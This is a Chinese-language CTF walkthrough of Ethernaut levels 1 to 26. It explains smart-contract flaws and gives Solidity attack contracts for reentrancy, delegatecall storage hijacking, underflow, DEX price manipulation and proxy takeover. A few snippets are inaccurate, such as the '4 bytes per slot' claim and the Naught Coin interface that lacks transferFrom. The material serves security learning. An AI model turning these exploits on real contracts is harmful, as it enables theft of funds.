# Writeup(31)

## 1.Hello Ethernaut

跟着返回的提示调用合约函数

![](../images/a-ethnaut-1-1.png)

## 2.Fallback

1. 调用contribute函数捐款小于0.001e的数额, getContribution函数返回值大于0
2. 发送任意数额的eth调用fallback函数, owner改为当前账户
3. 调用withdraw提取所有金额

## 3.Fallout

Fal1out并不是构造函数, 手动调用即可

注意:Solidity合约构造函数不能和合约名一样

## 4.Coin Flip

编写合约代码, 提前计算结果, 在不同的区块下调用guess函数10次

```solidity
contract Guess {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip x = CoinFlip(0x7B588F9C807501337AFa5AeF3945bd18FdAF9CbF);

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        x.flip(side);
    }
}
```

## 5.Telephone

tx.origin是交易的发起者, msg.sender是当前函数的调用者
编写hack合约, 通过合约调用changeOwner函数

```solidity
contract Hack {
    constructor() {
        Telephone t = Telephone(0x35B2bAb61Ee13B9256811B693AA054Ad1dd016Ec);
        t.changeOwner(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f);
    }
}
```

## 6. Token

向任意地址发送21单位的token

```solidity
// 直接操作uint256变量减法会有溢出问题
require(balances[msg.sender] - _value >= 0);
```

## 7.Delegation

利用下面的代码完成代理调用

```solidity
(bool result,) = address(delegate).delegatecall(msg.data);
```

向Delegation合约发送0eth, tx的data部分为pwn的方法id

## 8. Force

使用selfdestruct销毁自建合约, 向目标合约发送eth

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hack {
    constructor() payable public {
        selfdestruct(0x888Eaa51Cd5E643DFc19b594DA803362c5265B7b);
    }
}
```

## 9. Vault

使用函数w3.eth.get_storage_at读取对应slot值, 获取password, 调用unlock函数解锁

## 10. King

使用合约向目标合约转0.001eth, 成为新的king, 其他人再尝试获得king会因为transfer不成功而失败
注意要使用低级调用call函数, 当调用数据为空时, 会自动调用目标合约的receive函数

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hack {
    constructor() payable public {
        (bool success,) = 0xaD5Ae7Ec24Ae99e2971F5f0D5c21DCBe24189962.call{value: msg.value}("");
        require(success, "failed");
    }
}
```

## 11. Re-entrancy

目标合约的withdraw函数先转账再扣除余额, 引发重入攻击
攻击合约实现receive函数, 当目标合约的余额大于0时, 可以继续递归调用withdraw函数提取资金

```solidity
// 部署合约附带0.001e
contract Hack {
    Reentrance r = Reentrance(0xFAe73a7Df5253a2a8b7e32987866c2B157861371);

    constructor() payable public {
        r.donate{value: msg.value}(address(this));
    }

    function hack() public {
        r.withdraw(r.balanceOf(address(this)));
        selfdestruct(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f);
    }

    receive() external payable {
        if (address(r).balance > 0) {
            r.withdraw(r.balanceOf(address(this)));
        }
    }
}
```

## 12. Elevator

编写攻击合约, 实现isLastFloor方法, 判断Elevator合约的floor是否为目标楼层, 根据情况返回结果

```solidity
contract Hack {
    Elevator e = Elevator(0x5C77b7D11a6CeDc83D0f41D096C3E6874dF7CeF9);

    function hack() public {
        e.goTo(10);
    }

    function isLastFloor(uint256 floor) external view returns (bool) {
        uint256 i = e.floor();
        if (i == floor) return true;
        else return false;
    }

}
```

## 13. Privacy

solidity合约的每个slot存4个bytes
变量值排布如下

```
0: |X    X    X    bool|
1: |      uint256      |
2: |uint8 uint8 uint16 |
3: |      bytes32      |
4: |      bytes32      |
5: |      bytes32      |
```

因此所需数据data[2]在slot5中
再对数据截断, 转换为bytes16
参考文档: https://docs.soliditylang.org/en/v0.8.7/internals/layout_in_storage.html#

## 14. Gatekeeper One

使用合约间接调用绕过gateOne函数限制,
gateThree所需的参数gateKey计算方法:

```solidity
bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
```

执行到gateTwo需要消耗部分gas, 剩余gas不确定, 可以通过循环暴力尝试

```solidity
contract Hack {
    bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

    function attack() public {
        for (uint256 i = 0; i < 3000; i++) {
            (bool success,) = address(0x369bfaf01354101F4c6B4b37A257b355894B03a8).call{gas: i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
    }
}
```

## 15. Gatekeeper Two

通过中间合约绕过gateOne,
在合约构造函数中调用目标函数, 被调用合约中获得的代码段size为0, 从而绕过gateTwo
利用异或计算规则:A ^ B = C 则 A ^ C = B, gateThree的Key计算如下

```solidity
bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
```

最终合约

```solidity
contract Hack {
    constructor() public {
        GatekeeperTwo g = GatekeeperTwo(0x834b721Ba3299155f5Cb89906662427A6A8Ab0C2);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        g.enter(key);
    }
}
```

## 16. Naught Coin

目标合约仅限制msg.sender为玩家, 可以通过合约调用绕过限制
先approve授权token到攻击合约, 再使用攻击合约调用transferFrom转账

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Coin {
    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address t) external view returns (uint256);
}

contract Hack {
    function attack() public {
        Coin c = Coin(0x0eBff6279fa409d47004d66baDD14ea137f04De1);
        c.transferFrom(address(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f), address(1), c.balanceOf(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f));
    }
}
```

## 17. Preservation

delegatecall调用合约时, 会使用被调合约的代码, 修改当前调用合约对应slot的值,
利用该特性, 先调用setFirstTime函数修改slot0也就是timeZone1Library的值为攻击合约地址,
再调用setFirstTime利用攻击合约的代码修改slot2也就是owner的值

```solidity
contract Hack {
    uint256 public s1;
    uint256 public s2;
    address public s3;

    function setTime(uint256 _timeStamp) public {
        s3 = 0x3E9436324544C3735Fd1aBd932a9238d8Da6922f; // player地址
    }
}
```

## 18. Recovery

通过区块浏览器查询到创建的SimpleToken合约地址为0xC1a1118fAAB0Ae16A4Ad026D0c30d139B7e0d550
然后调用该合约的destroy函数获取所有eth

## 19. MagicNumber

智能合约包含2部分

- 初始化代码(构造函数逻辑)
    - evm创建合约时运行
- 运行时代码(其他逻辑)
    - 实际的执行逻辑, 题目限制10bytes, 需要返回bytes32的数字42

```
合约初始化代码
600a
600c
6000
39    ---- CODECOPY(0x00, 0x0c, 0x0a)  复制0c位置开始, 长度10个bytes的代码
600a
6000
f3    ---- RETURN(0x00, 0x0a)  返回0x00位置开始, 长度0x0a的数据
---
合约运行时代码
602a  
6080
52    ---- MSTORE(0x80, 0x2a) 将0x2a(42)存到0x80位置
6020
6080
f3    ---- RETURN(0x80, 0x20) 返回0x80位置, 长度0x20的值

最终合约代码: 600a600c600039600a6000f3602a60805260206080f3
```

参考: https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2

## 20. Alien Codex

先调用make_contact函数绕过contacted限制,
再调用retract函数, codex.length会溢出, 这样可以通过revise函数修改所有storage slot的值

```
合约slot排布:
slot 0: contact(1bytes) | owner(20bytes)
slot 1: codex.length
slot keccak256(1): codex[0]
slot keccak256(1) + 1: codex[1]
······
slot 2^256 - 1: codex[2^256 - 1 - uint(keccak256(1))]
slot 0: codex[2^256 - 1 - uint(keccak256(1)) + 1] (数组storage排列是连续的)
```

使用revise函数修改codex[2^256 -1 - uint(keccak256(1)) + 1]也就是slot0的值

```solidity
contract Hack {
    constructor() public {
        AlienCodex a = AlienCodex(0x9F3fC842FB42203130D3D1540b296f41B823b06e);
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        a.makeContact();
        a.retract();
        a.revise(index, myAddress);
    }
}
```

注意contact值也会被覆盖

## 21. Denial

withdraw函数会向partner转账, 可以考虑将partner设置为攻击合约, 通过fallback函数浪费gas达到目标

```solidity
contract Waste {}

contract Hack {
    fallback() external payable {
        for (uint i = 0; i < 1000; i++) {
            new Waste();
        }
    }
}
```

## 22. Shop

view函数可以访问链上状态信息, 可以根据Shop合约状态返回不同的price

```solidity
contract Hack {
    Shop p = Shop(0x56dCBf9363079e245d9034bB5874Bd8669Ef508c);

    function price() public view returns (uint256) {
        if (p.isSold()) {
            return 50;
        } else {
            return 200;
        }
    }

    function attack() public {
        p.buy();
    }
}
```

## 23. Dex

Dex合约的getSwapPrice函数计算Token价格有误, 可以通过来回交换代币来消耗dex合约的代币

```solidity
contract Hack {
    Dex d = Dex(0x198687D61b5c42c820c5C411bD2d6D6b9d8D0556);
    address[2] tokens = [d.token1(), d.token2()];
    constructor() {
        // 转移代币到hack合约
        SwappableToken(tokens[0]).approve(msg.sender, address(this), type(uint256).max);
        SwappableToken(tokens[1]).approve(msg.sender, address(this), type(uint256).max);
        IERC20(tokens[0]).transferFrom(msg.sender, address(this), IERC20(tokens[0]).balanceOf(msg.sender));
        IERC20(tokens[1]).transferFrom(msg.sender, address(this), IERC20(tokens[0]).balanceOf(msg.sender));
        d.approve(address(d), type(uint256).max);
    }
    function hack() public {
        uint256[2] memory hackBalances;
        uint256[2] memory dexBalances;
        uint fromIndex = 0;
        uint toIndex = 1;
        while (true) {
            hackBalances = [SwappableToken(tokens[fromIndex]).balanceOf(address(this)),
                                    SwappableToken(tokens[toIndex]).balanceOf(address(this))];

            dexBalances = [SwappableToken(tokens[fromIndex]).balanceOf(address(d)),
                                    SwappableToken(tokens[toIndex]).balanceOf(address(d))];

            uint256 swapAmount = d.getSwapPrice(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
            if (swapAmount > dexBalances[toIndex]) {
                d.swap(tokens[fromIndex], tokens[toIndex], dexBalances[0]);
                break;
            } else {
                d.swap(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
            }
            fromIndex = 1 - fromIndex;
            toIndex = 1 - toIndex;
        }
    }
}
```

## 24. Dex Two

swap函数没有限制from和to的代币地址, 可以伪造代币, 操纵swap价格

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface DexTwo {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(address from, address to, uint256 amount) external;
}

contract Hack {
    DexTwo d = DexTwo(0x297F9e9F984136357A772386Cb0c37923f0a24cf);

    function balanceOf(address) public view returns (uint256){
        return 1;
    }

    function transferFrom(address from, address to, uint amount) public returns (bool) {
        return true;
    }

    function attack() external {
        d.swap(address(this), d.token1(), 1);
        d.swap(address(this), d.token2(), 1);
    }
}

```

## 25. Puzzle Wallet

pendingAdmin和owner在同一个slot, 可以先调用proposeNewAdmin函数, 获得owner权限
再添加自己为白名单, 获得deposit权限
multicall函数可以重入, 利用这一点通过multicall函数调用一次deposit和multicall函数(参数也是deposit)来提取资金
最后通过setMaxBalance函数设置admin

```solidity
interface PuzzleWallet {
    function balances(address addr) external view returns (uint256);

    function admin() external view returns (address);

    function pendingAdmin() external view returns (address);

    function maxBalance() external view returns (address);

    function owner() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address addr) external;

    function setMaxBalance(uint256 _maxBalance) external;

    function multicall(bytes[] calldata data) external payable;

    function execute(address to, uint256 value, bytes calldata data) external payable;
}

contract Hack {
    PuzzleWallet d = PuzzleWallet(0x03d610c7078E46c2995b9C254e09a2F6EbA32e25);

    constructor() payable {
        // 获取权限
        d.proposeNewAdmin(address(this));
        d.addToWhitelist(address(this));
        // 重入调用存入金额
        bytes memory deposit_call = abi.encodeWithSignature("deposit()");
        bytes[] memory data = new bytes[](2);
        data[0] = deposit_call;
        bytes[] memory dc = new bytes[](1);
        dc[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("multicall(bytes[])", dc);
        d.multicall{value: msg.value}(data);
        // 提取金额, maxBalance变为0
        d.execute(address(this), d.balances(address(this)), bytes(""));
        // 设置maxBalance变相覆盖admin值
        d.setMaxBalance(uint256(uint160(address(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f))));
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
```

## 26. Motorbike

MotorBike合约的storage已经有initialize的标记, 无法再次调用initialize函数, 但engine合约的storage部分没有,
通过查询MotorBike合约slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc的值,
获取engine代码合约的地址为 0xbeeb399F0F7A7d68Bc821297AdEf84e813Ed1A09
再调用engine合约的initialize函数获取upgrader权限
之后通过upgradeToAndCall函数, 传入hack合约并执行initialize函数销毁自身

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface Engine {
    function upgrader() external view returns (address);

    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Hack {
    function initialize() external {
        selfdestruct(payable(msg.sender));
    }
}

contract Hack1 {
    constructor() {
        Engine e = Engine(0xbeeb399F0F7A7d68Bc821297AdEf84e813Ed1A09);
        e.initialize();
        // 传入Hack合约地址
        e.upgradeToAndCall(0xD53542c0ea17f70A8035fb14b319f35Bf475208f, abi.encodeWithSignature("initialize()"));
    }
}
```